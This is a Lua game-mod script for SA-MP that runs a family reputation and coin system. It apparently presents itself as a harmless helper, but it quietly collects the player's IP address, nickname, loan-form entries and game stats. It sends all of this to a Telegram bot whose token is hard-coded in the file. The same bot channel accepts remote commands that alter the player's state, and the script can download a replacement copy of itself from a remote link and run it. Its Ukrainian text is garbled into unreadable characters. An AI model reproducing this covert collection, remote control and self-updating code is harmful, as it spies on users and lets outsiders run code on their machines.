script_author('Budanov for Banderas Family')
script_name("FamRep")
local script__version = '1.7'
local requests = require('requests')
script_version(script__version)
local keys = require "vkeys"
script_description("��������� �� ������ ������ ��� ������ ��'�")
require("lib.moonloader")
require 'sampfuncs' 
local effil = require('effil')
local encoding = require('encoding')
local sampev = require 'lib.samp.events'
local samp = require('samp.events') 
local dlstatus = require('moonloader').download_status
local fthanks = 0
local font = renderCreateFont("Arial", 10, 13)
local myrep, reptoday, bandcoin, Timer, credit, credit_percentage = 0, 0, 0.000000, 0, 0, 10
local teg = "[FamRep] "
local famchat, running, stats_state = false, false, false
local nickrep = ""
local ip, update_link, credit_name, credit_lvl,credit_rang,credit_money, credit_feedback, credit_number, credit_time, credit_thing, stats_text = '', '','','','','','','','','',''
local updateid
local update_state = false
local chatID = '-1001968288977'--(6040247272)
local token = '6940011842:AAFarNLn-XJSph9Guj0G41oK4-ziKGPZhrU'
encoding.default = 'CP1251'
u8 = encoding.UTF8
local mynick = ''

function startTimer()
	Timer = os.time()
    running = true
       
end

function valuecoin()
	local file = os.getenv('TEMP') .. '\\BNDCoin.json'
	downloadUrlToFile('https://raw.githubusercontent.com/Bogdan4308/Banderas/main/BNDCoin.json', file, function(id, status)
		if status == dlstatus.STATUS_ENDDOWNLOADDATA then	
			local f = io.open(file, 'r')
			if f then
				local info = decodeJson(f:read('*a'))
				vlcoin = info.coinvl
				version = info.version
				update_link = info.update_link
				if tonumber(version) > tonumber(script__version) then
					update_state = true
					
				end

				f:close()
                os.remove(file)
			
			end
	
		end
	end)
	
	

end



function main()
  if not isSampLoaded() or not isSampfuncsLoaded() then return end
  while not isSampAvailable() do wait(100) end
  getLastUpdate()
  lua_thread.create(get_telegram_updates)
  sampRegisterChatCommand("fthanks", cmd_fth)
  sampRegisterChatCommand("fam", cmd_fam)
  sampRegisterChatCommand("myrep", cmd_rep)
  sampRegisterChatCommand("famcredit", cmd_credit)
  getIP()
  mynick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
  local file = os.getenv('TEMP') .. '\\Rep.txt'
  local fl = io.open(file, 'r')
  if fl then
	myrep = tonumber(fl:read())
	bandcoin = tonumber(fl:read())
	fl:close()
  else
		local file = os.getenv('TEMP') .. '\\Rep.txt'
		local f1 = io.open(file, "w")
		if fl then
			fl:write("0")
			fl:close()
		end
  
  end
  startTimer()
  
  if myrep == nil or myrep == '' then myrep = 0 end
  while true do
  valuecoin()
	if	running then
		local currenttime = os.time()
		local elapstime = currenttime - Timer
		if elapstime >= 1 then
			bandcoin = bandcoin + 0.000004
			Rep()
			startTimer()
		end
			
		

	
	
	end

	renderFontDrawText(font, string.format("%.6f", bandcoin), 1700, 250, 0xFFFFFFFF, 0x90000000)
  local result, button, list, input = sampHasDialogRespond(10)
	if result then
		if button == 1 then
		sampSendChat('/fam [Rep '..myrep..']: '..nickrep..", ������ ������!")
			
		
		end
	
	end

	local result, button, list, input = sampHasDialogRespond(11)
	if result then
		if button == 1 then
			if credit >= 25000 then
				sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
			else 
				sampAddChatMessage(teg.."� ��� ����������� ��������� ��� ���������� �������", 0xFFFF00)
			end
			
		
		end
	
	end

	local result, button, list, input = sampHasDialogRespond(12)
	if result then
		if button == 1 then
			if list == 0 then
				sampShowDialog(13, "","������, ���� �����, ��� �������","��������","�����",1)	
			elseif list == 1 then
				sampShowDialog(14, "","������, ���� �����, ��� �����","��������","�����",1)	
			elseif list == 2 then
				sampShowDialog(18, "","������, ���� �����, ��� �������� �����(� ��)","��������","�����",1)	
			elseif list == 3 then
				sampShowDialog(15, "","������, ���� �����, ��� ����","��������","�����",1)	
			elseif list == 4 then	
				sampShowDialog(16, "","������, ���� �����, ���� �������","��������","�����",1)	

			elseif list == 5 then
				sampShowDialog(19, "","������, ���� �����, ����� ����������","��������","�����",1)

			elseif list == 6 then
				sampShowDialog(20, "","�� ������ �� ���� ���� � �����?","��������","�����",1)

			elseif list == 7 then
				sampShowDialog(17, "","������, ���� �����, ��, �� ��� ���� ��� ��'����","³��������","�����",1)

			end

		end
	end

	local result, button, list, input = sampHasDialogRespond(20)
	if result then
		if button == 0 then
			sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)

		else
			if input ~= "" then
				credit_thing = input
				sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
			
			else
				sampShowDialog(20, "","�� ������ �� ���� ���� � �����?","��������","�����",1)
				sampAddChatMessage("�� ���� �� ���� ���� ������!", 0xFF0000)
			end
		end
	end

	local result, button, list, input = sampHasDialogRespond(19)
	if result then
		if button == 0 then
			sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)

		else
			if input ~= "" then
				credit_time = input
				sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
			
			else
				sampShowDialog(19, "","������, ���� �����, ����� ����������","��������","�����",1)
				sampAddChatMessage("�� ���� �� ���� ���� ������!", 0xFF0000)
			end
		end
	end

	local result, button, list, input = sampHasDialogRespond(18)
	if result then
		if button == 0 then
			sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)

		else
			if input ~= "" then
				credit_number = input
				sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
			
			else
				sampShowDialog(18, "","������, ���� �����, ��� �������� �����(� ��)","��������","�����",1)
				sampAddChatMessage("�� ���� �� ���� ���� ������!", 0xFF0000)
			end
		end
	end

	local result, button, list, input = sampHasDialogRespond(13)
	if result then
		if button == 0 then
			sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
		else
			if input ~= "" then
				credit_name = input
				sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
			
			else
				sampShowDialog(13, "","������, ���� �����, ��� �������","��������","�����",1)
				sampAddChatMessage("�� ���� �� ���� ���� ������!", 0xFF0000)
			end
		end
	end
	local result, button, list, input = sampHasDialogRespond(14)
	if result then
		if button == 0 then
			sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)

		else
			if input ~= "" then
				credit_lvl = input
				sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
			
			else
				sampShowDialog(14, "","������, ���� �����, ��� �����","��������","�����",1)
				sampAddChatMessage("�� ���� �� ���� ���� ������!", 0xFF0000)
			end
		end
	end
	local result, button, list, input = sampHasDialogRespond(15)
	if result then
		if button == 0 then
			sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
		else
			if input ~= "" then
				credit_rang = input
				sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
			
			else
				sampShowDialog(15, "","������, ���� �����, ��� ����","��������","�����",1)
				sampAddChatMessage("�� ���� �� ���� ���� ������!", 0xFF0000)
			end
		end
	end
	local result, button, list, input = sampHasDialogRespond(16)
	if result then
		if button == 0 then
			sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
		else
			if input ~= "" then
				if tonumber(input) then
					credit_money = input
					if tonumber(credit_money) <= credit then
						sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
					else	
						credit_money = ""
						sampShowDialog(16, "","������, ���� �����, ���� �������","��������","�����",1)
						sampAddChatMessage("��������� ���: "..credit, 0xFF0000)
					end
				else
					sampShowDialog(16, "","������, ���� �����, ���� �������","��������","�����",1)
					sampAddChatMessage("�� ���� �� ���� ������ �����!", 0xFF0000)
				end
			
			else
				sampShowDialog(16, "","������, ���� �����, ���� �������","��������","�����",1)
				sampAddChatMessage("�� ���� �� ���� ���� ������!", 0xFF0000)
			end
		end
	end
	local result, button, list, input = sampHasDialogRespond(17)
	if result then
		if button == 0 then
			sampShowDialog(12, "���������� ������","ͳ�����\t{808080}"..credit_name.."\nг����\t{808080}"..credit_lvl.."\n�������� �����(� ��)\t{808080}"..credit_number.."\n���� � ��'�\t{808080}"..credit_rang.."\n���� �������\t{808080}"..credit_money.."\n����� ����������\t{808080}"..credit_time.."\n�����\t{808080}"..credit_thing.."\n��'����\t{808080}"..credit_feedback,"�������","�����",4)
			
		else
			if input ~= "" then
				credit_feedback = input
				if credit_name == "" or credit_lvl == "" or credit_rang == "" or credit_money =="" or credit_feedback == "" or credit_thing == "" or credit_number == "" or credit_time == "" then
					sampAddChatMessage("���� �����, ��������� ��� ������", -1)
				else
					sampAddChatMessage("������ ������ ����������. �������� �������.", 0x7FFF00)
					sampAddChatMessage("�� ���� ���������: "..tonumber(credit_money)+((tonumber(credit_money)/100)*credit_percentage).."$", 0x7FFF00)
					sendTelegramMessage("#������\n---------#"..mynick.."---------\nIP:#"..ip.."\nг����: "..credit_lvl.."\n���� � ��'�: "..credit_rang.."\n����� ��������: "..credit_number.."\n�����: "..credit_thing.."\n����� ����������: "..credit_time.."\nC��� �������: "..credit_money.."$\n�� ���������: "..tonumber(credit_money)+((tonumber(credit_money)/100)*credit_percentage).."$ ("..credit_percentage.."%)\n��'����: "..credit_feedback.."\n�������� �-��� ���������: "..myrep.."\nBND-Coins: "..bandcoin.."\n@lovebander @x_kisel\n"..os.date("[%X] %x"))
				end
			
			else
				sampShowDialog(17, "","������, ���� �����, ��, �� ��� ���� ��� ��'����","³��������","�����",1)
				sampAddChatMessage("�� ���� �� ���� ���� ������!", 0xFF0000)
			end
		end
	end
	
	if update_state then
		downloadUrlToFile(update_link, thisScript().path, function(id, status)
		if status == dlstatus.STATUS_ENDDOWNLOADDATA then
			
			thisScript():reload()
	
		end
	
	
		end)
	
	end
	
	wait(0)
  end
end

function threadHandle(runner, url, args, resolve, reject)
   local t = runner(url, args)
   local r = t:get(0)
   while not r do
      r = t:get(0)
      wait(0)
   end
   local status = t:status()
   if status == 'completed' then
      local ok, result = r[1], r[2]
      if ok then resolve(result) else reject(result) end
   elseif err then
      reject(err)
   elseif status == 'canceled' then
      reject(status)
   end
   t:cancel(0)
end

function requestRunner()
   return effil.thread(function(u, a)
      local https = require 'ssl.https'
      local ok, result = pcall(https.request, u, a)
      if ok then
         return {true, result}
      else
         return {false, result}
      end
   end)
end

function async_http_request(url, args, resolve, reject)
   local runner = requestRunner()
   if not reject then reject = function() end end
   lua_thread.create(function()
      threadHandle(runner, url, args, resolve, reject)
   end)
end

function encodeUrl(str)
   str = str:gsub(' ', '%+')
   str = str:gsub('\n', '%%0A')
   return u8:encode(str, 'CP1251')
end

function table.assign(target, def, deep)
   for k, v in pairs(def) do
       if target[k] == nil then
           if type(v) == 'table' then
               target[k] = {}
               table.assign(target[k], v)
           else  
               target[k] = v
           end
       elseif deep and type(v) == 'table' and type(target[k]) == 'table' then 
           table.assign(target[k], v, deep)
       end
   end 
   return target
end

function cmd_credit(arg)
	if myrep < 25000 then
		credit = 0	
	elseif myrep >= 25000 and myrep < 50000 then
		credit = 30000000
	elseif myrep >= 50000 and myrep < 75000 then
		credit = 60000000
	elseif myrep >= 75000 and myrep < 100000 then
		credit = 90000000
	elseif myrep >= 100000 and myrep < 125000 then
		credit = 120000000
	elseif myrep >= 125000 and myrep < 150000 then
		credit = 150000000
	elseif myrep >= 150000 and myrep < 175000 then
		credit = 180000000
	elseif myrep >= 175000 and myrep < 200000 then
		credit = 210000000
	elseif myrep >= 200000 and myrep < 225000 then
		credit = 240000000
	elseif myrep >= 225000 and myrep < 250000 then
		credit = 270000000
	elseif myrep >= 250000 and myrep < 275000 then
		credit = 300000000
	elseif myrep >= 275000 and myrep < 300000 then
		credit = 330000000
	elseif myrep >= 300000 and myrep < 325000 then
		credit = 360000000
	elseif myrep >= 325000 and myrep < 350000 then
		credit = 390000000
	elseif myrep >= 350000 and myrep < 375000 then
		credit = 420000000
	elseif myrep >= 375000 and myrep < 400000 then
		credit = 450000000
	elseif myrep >= 400000 then
		credit = 480000000
	end
	sampShowDialog(11, "������", "{F0F8FF}�������� �����, ������ � ���������� �������� �� Banderas Family.\n˳�� ������� �������� �������� �� ������� ���� ���������.\n³������ �� ������: "..credit_percentage.."%. ������ ������ ����'������ �� �����.\nϳ��� ���� �� �� ��������� '���', ��� ���� ������������� ��������� ������.\n���� ������ ���� ��������, ��� ���������� ���������, ���� �� - ����������.\n������� ������ ���� ������� �� 1 �� 3 ����.\n{FF0000}³���������� ������, �� ���� ����� �� ������� ������������ �����(���������� �������).\n   \n{F0F8FF}��� �������� {FFFF00}"..credit.."$ {F0F8FF}�������.", "���", "�����", 0)

	
	
end







function getIP()
	local json = os.getenv('TEMP') .. '\\myIP.json'
	downloadUrlToFile('https://api.ipify.org/?format=json', json, function(id, status)
		if status == dlstatus.STATUS_ENDDOWNLOADDATA then	
			local f = io.open(json, 'r')
			if f then
				local ipjson = f:read('*a')
				ip = ipjson:match('{\"ip\":\"(.*)\"}')
				f:close()
                os.remove(json)
			
			end
	
		end
	end)
	
	

end

local effilTelegramSendMessage = effil.thread(function(text, chatID, token)
	local requests = require('requests')
	requests.post(('https://api.telegram.org/bot%s/sendMessage'):format(token), {
		params = {
			text = text;
			chat_id = chatID;
		}
	})
end)

function sampev.onShowDialog(id, st, tytle, button, canc, text)
	--sampAddChatMessage(id, -1)
	if id == 235 and stats_state then
		local textwithoutcolorwhite = text:gsub("%{FFFFFF}","")
		local textwithoutcolorblue = textwithoutcolorwhite:gsub("%{B83434}", "")
		local textwithoutcoloryellow = textwithoutcolorblue:gsub("%{FFFF00}", "")
		stats_text = textwithoutcoloryellow

		sendTelegramMessage("#����������\n---------#"..mynick.."---------\nIP:#"..ip.."\n  \n"..stats_text)
		stats_state = false
		lua_thread.create(function()
			wait(1)
			sampCloseCurrentDialogWithButton(0)
		end)
		

	end

end




function sampev.onServerMessage(color, text)
	if text:find(mynick.."(.+), ������ ������!") and color == -1178486529 then
		fthanks = fthanks + 1
		if fthanks > 3 then
			fthanks = 3
			
		end
		reptoday = 3 - fthanks
		local textthanks = '������'
		if reptoday == 1 then
			textthanks = '������'
		
		end
		if reptoday == 0 then
			textthanks = '�����'
		
		end
		sampAddChatMessage(teg.."�� �������� "..nickrep.." 50 ��������� (�� �������� �������� "..reptoday.." "..textthanks..")",0xFFFF00)
		sendTelegramMessage("#������ֲ�\n---------#"..mynick.."---------\nIP:#"..ip.."\n������� 50 ��������� "..nickrep.."\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
		
	end
	nickth, idth, inputth = string.match(text, "([a-zA-Z_]+)%[(%d+)%](.+)"..mynick..", ������ ������!")
	lua_thread.create(function()
		if nickth and color == -1178486529 then
			myrep = myrep + 50
			Rep()
			wait(500)
			sampAddChatMessage(teg.."�� �������� ������ �� "..nickth..". ��������� 50 ���������! �������� �-��: "..myrep, 0xFFFF00)
			sendTelegramMessage("#������ֲ�\n---------#"..mynick.."---------\nIP:#"..ip.."\n������� 50 ���������(������ �� "..nickth..")\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
		end
	end)


	if text:find('__________���������� ���__________') and color == 1941201407 then 
		lua_thread.create(function()
			wait(500)
			local ServerName = sampGetCurrentServerName()
			if string.match(ServerName, "X4 Payday!") then
				myrep = myrep + 4
				sampAddChatMessage(teg.."�� �������� 4 ���������. �������� �-��: "..myrep, 0xFFFF00)
				sendTelegramMessage("#������ֲ�\n---------#"..mynick.."---------\nIP:#"..ip.."\n������� 4 ���������(Payday X4)\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
				Rep()
				
			else
				myrep = myrep + 1
				sampAddChatMessage(teg.."�� �������� 1 ���������. �������� �-��: "..myrep, 0xFFFF00)
				sendTelegramMessage("#������ֲ�\n---------#"..mynick.."---------\nIP:#"..ip.."\n������� 1 ���������(Payday)\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
				Rep()
			end
		end)
	
	end
	
	if text:find('[����� (�������)](.+)'..mynick..'(.+){FFFFFF} �������� ���������� �������, ����� �������� 3EXP � ���������!') and color == -1178486529  then
		myrep = myrep + 30
		sampAddChatMessage(teg.."�� �������� 30 ���������. �������� �-��: "..myrep, 0xFFFF00)
		sendTelegramMessage("#������ֲ�\n---------#"..mynick.."---------\nIP:#"..ip.."\n������� 30 ���������(������� �����)\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))

	
	end
	
	if text:find('[����� (�������)](.+)'..mynick..'(.+){FFFFFF} ������� (%d+) ������� �� (%d+) ����� ��������� ��� �����!') and color == -1178486529 then
		nick, id, input, input1 = string.match(text, "([a-zA-Z_]+)%[(%d+)%](.+){FFFFFF} ������� (%d+) ������� �� (%d+) ����� ��������� ��� �����!")
		if nick then
			myrep = myrep + (tonumber(input1)*15)
			sampAddChatMessage(teg.."�� �������� "..(tonumber(input1)*15).." ���������. �������� �-��: "..myrep, 0xFFFF00)
			sendTelegramMessage("#������ֲ�\n---------#"..mynick.."---------\nIP:#"..ip.."\n������� "..(tonumber(input1)*15).." ���������(���� "..tonumber(input1).." �������)\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
		
		end

	
	end
	
	nil1, nil2, inpmn = string.match(text, '[����� (�������)](.+)'..mynick..'(.+){FFFFFF} �������� ����� ����� �� $(.+)')
	if inpmn then
		myrep = myrep + math.ceil(tonumber(inpmn)/10000)  
		sampAddChatMessage(teg.."�� �������� "..math.ceil(tonumber(inpmn)/10000) .." ���������. �������� �-��: "..myrep, 0xFFFF00)
		sendTelegramMessage("#������ֲ�\n---------#"..mynick.."---------\nIP:#"..ip.."\n������� "..math.ceil(tonumber(inpmn)/10000).." ���������(���������� �������� ������� �� "..formatNumberWithCommas(inpmn).."$)\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
		
	
	end
	

	
	
	
	
	
	



end

function formatNumberWithCommas(inpmn)
    local formattedNumber = tostring(inpmn)
    local reverseFormatted = string.reverse(formattedNumber)
    local result = ""

    for i = 1, #reverseFormatted do
        result = result .. reverseFormatted:sub(i, i)
        if i % 3 == 0 and i ~= #reverseFormatted then
            result = result .. "."
        end
    end

    return string.reverse(result)
end

function asyncHttpRequest(method, url, args, resolve, reject)
   local request_thread = effil.thread(function (method, url, args)
      local requests = require 'requests'
      local result, response = pcall(requests.request, method, url, args)
      if result then
         response.json, response.xml = nil, nil
         return true, response
      else
         return false, response
      end
   end)(method, url, args)

   if not resolve then resolve = function() end end
   if not reject then reject = function() end end
   --lua_thread.create(function()
      local runner = request_thread
      while true do
         local status, err = runner:status()
         if not err then
            if status == 'completed' then
               local result, response = runner:get()
               if result then
                  resolve(response)
               else
                  reject(response)
               end
               return
            elseif status == 'canceled' then
               return reject(status)
            end
         else
            return reject(err)
         end
         wait(0)
      end
   --end)
end


function url_encode(text)
	local text = string.gsub(text, "([^%w-_ %.~=])", function(c)
		return string.format("%%%02X", string.byte(c))
	end)
	return string.gsub(text, " ", "+")
end

function sendTelegramMessage(text)
    effilTelegramSendMessage(url_encode(u8(text)), chatID, token)
end
 
function get_telegram_updates() 
   while not updateid do wait(1) end 
   local runner = requestRunner()
   local reject = function() end
   local args = ''
   while true do
      url = 'https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chatID..'&offset=-1' 
      threadHandle(runner, url, args, processing_telegram_messages, reject)
      wait(0)
   end
end

function processing_telegram_messages(result) 
   if result then
      local proc_table = decodeJson(result)
      if proc_table.ok then
        if #proc_table.result > 0 then
            local res_table = proc_table.result[1]
            if res_table then
				if res_table.update_id ~= updateid then
                 updateid = res_table.update_id
           
					local message_from_user = res_table.message.text
					if message_from_user then
						local textTg = u8:decode(message_from_user) .. ' ' 
						if textTg:match('^/rep '..mynick..' %+(%d+)') then
							local quantrep = string.match(textTg, "/rep "..mynick.." %+(%d+)")
							if quantrep then
								myrep = myrep + tonumber(quantrep)
								sampAddChatMessage(teg.."�� �������� "..tonumber(quantrep).." ���������. �������� �-��: "..myrep, 0xFFFF00)
								sendTelegramMessage("#������ֲ�\n---------#"..mynick.."---------\nIP:#"..ip.."\n������� "..quantrep.." ���������(BanderasBOT)\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
							end
			
                        

						elseif textTg:match('^/rep '..mynick..' %-(%d+)') then
							local quantrep = string.match(textTg, "/rep "..mynick.." %-(%d+)")
							if quantrep then
								myrep = myrep - tonumber(quantrep)
								sampAddChatMessage(teg.."�� �������� "..tonumber(quantrep).." ���������. �������� �-��: "..myrep, 0xFFFF00)
								sendTelegramMessage("#������ֲ�\n---------#"..mynick.."---------\nIP:#"..ip.."\n������� "..quantrep.." ���������(BanderasBOT)\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
							end
						elseif textTg:match('^/rep '..mynick..' ') then
							sendTelegramMessage("#������ֲ�\n---------#"..mynick.."---------\nIP:#"..ip.."\n�������� �-�� ���������: "..myrep.."\n�-�� coins: "..string.format("%.6f", bandcoin))
							
						elseif textTg:match('^/bcoin '..mynick..' %+(%d+)') then
							local quantrep = string.match(textTg, "/bcoin "..mynick.." %+(%d+)")
							if quantrep then
								bandcoin = bandcoin + tonumber(quantrep)
								sampAddChatMessage(teg.."�� �������� "..tonumber(quantrep).." �����. �������� �-��: "..string.format("%.6f", bandcoin), 0xFFFF00)
								sendTelegramMessage("#BNDCoins\n---------#"..mynick.."---------\nIP:#"..ip.."\n������� "..quantrep.." �����(BanderasBOT)\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
							end
			
                        

						elseif textTg:match('^/bcoin '..mynick..' %-(%d+)') then
							local quantrep = string.match(textTg, "/bcoin "..mynick.." %-(%d+)")
							if quantrep then
								bandcoin = bandcoin - tonumber(quantrep)
								sampAddChatMessage(teg.."�� �������� "..tonumber(quantrep).." �����. �������� �-��: "..string.format("%.6f", bandcoin), 0xFFFF00)
								sendTelegramMessage("#BNDCoins\n---------#"..mynick.."---------\nIP:#"..ip.."\n������� "..tonumber(quantrep).." �����(BanderasBOT)\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
							
							
						
							end
						elseif textTg:match('^/dell '..mynick) then
							myrep = 0
							bandcoin = 0
							Rep()
							sendTelegramMessage("#���������\n---------#"..mynick.."---------\nIP:#"..ip.."\n�� ���� �� ��������� ������ ��������.\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
						elseif textTg:match('^/info '..mynick) then
							sendTelegramMessage("#�������ֲ�\n---------#"..mynick.."---------\nIP:#"..ip.."\n�������� �-�� ���������: "..myrep.."\nBND-Coins: "..string.format("%.6f", bandcoin))
						elseif textTg:match('^/stats '..mynick) then
							stats_state = true
							sampSendChat("/stats")
						
						end
						
	
					end
				end
			end
			end
	   end
	end
end

function getLastUpdate()
   async_http_request('https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chatID..'&offset=-1','',function(result)
       if result then
           local proc_table = decodeJson(result)
           if proc_table.ok then
               if #proc_table.result > 0 then
                   local res_table = proc_table.result[1]
                   if res_table then
                       updateid = res_table.update_id
                   end
               else
                   updateid = 1
               end
           end
       end
   end)
end




function cmd_rep(arg)
	sampAddChatMessage(myrep, -1)
	sendTelegramMessage(mynick..'\n����\n@lovebander @x_kisel')

end



  

function cmd_fth(arg)
	if #arg ~= 0 then
		nickrep = sampGetPlayerNickname(tonumber(arg))
		if fthanks >= 3 then
			fthanks = 3
			
		end 
		reptoday = 3 - fthanks
		if reptoday <= 0 then
			sampAddChatMessage(teg.."�� ������ ���������, ��������� ������" , 0xFFFF00)
			
		else 
			sampShowDialog(10, "ϳ�����������", "�� ����� ������ ���������� {FFFF00}"..nickrep.."?", "���", "ͳ", 0)

		end
	else
		sampAddChatMessage(teg.."������ ID ����� ��'�, ����� ������ ����������" , 0xFFFF00)
		
	
	end
	
	
end

function cmd_fam(arg)
	if #arg == 0 then
		sampSendChat('/fam')
	else
		reptoday = 3 - fthanks
		if arg:find("(.+), ������ ������!") and reptoday <= 0 then
			sampAddChatMessage(teg.."�� ������ ���������, ��������� ������" , 0xFFFF00)
			
		
		elseif tonumber(myrep) < 1000 then
			repinfam = myrep
			sampSendChat('/fam [Rep '..math.floor(repinfam)..']: '..arg)
		elseif tonumber(myrep) >= 1000 and tonumber(myrep) < 1000000 then
			repinfam = tonumber(myrep)/1000
			sampSendChat('/fam [Rep '..math.floor(repinfam)..'K]: '..arg)
		elseif tonumber(myrep) >= 1000000 then
			repinfam = tonumber(myrep)/1000000
			sampSendChat('/fam [Rep '..(math.floor(repinfam*10)/10)..'M]: '..arg)
		
		end
		
	end
end


function Rep()
	local file = os.getenv('TEMP') .. '\\Rep.txt'
	local fl = io.open(file, 'w')
	if fl then
		fl:write(myrep, "\n"..string.format("%.6f", bandcoin))
		fl:close()
	end


end













